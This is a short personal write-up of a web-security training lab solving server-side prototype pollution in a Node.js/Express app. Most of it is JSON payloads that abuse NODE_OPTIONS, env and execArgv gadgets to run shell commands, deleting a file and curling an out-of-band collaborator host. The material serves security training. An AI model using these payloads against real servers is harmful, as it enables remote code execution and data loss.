# Practitioner Lab 156: Remote code execution via server-side prototype pollution

---

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

### **Note**

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

```
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=0cdqhcomg9ytxweaekn07k0npev5jv7k.oastify.com\"\".oastify\"\".com"
}
```

By adding this payload and then running the admin process my collaborator reacted to it. 

![Untitled](Practitioner%20Lab%20156%20Remote%20code%20execution%20via%20ser%2028530f1a538843bfbcc0b0c6fa5b59ec/Untitled.png)

```
"__proto__":{
	 "env":{
		 "evil":"require('child_process').execSync('rm /home/carlos/morale.txt)
		 },
		 "NODE_OPTIONS":"--require /proc/self/environ"
		 }
		 }
```

```
"__proto__":{
	 "env":{
		 "evil":"require('child_process').execSync('curl collaborator.com')//"
		 },
		 "NODE_OPTIONS":"--require /proc/self/environ"
		 }
		 }
```

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

This will allow me to delete the file morale.txt at the home directory of carlos.

This solved the lab.

![Untitled](Practitioner%20Lab%20156%20Remote%20code%20execution%20via%20ser%2028530f1a538843bfbcc0b0c6fa5b59ec/Untitled%201.png)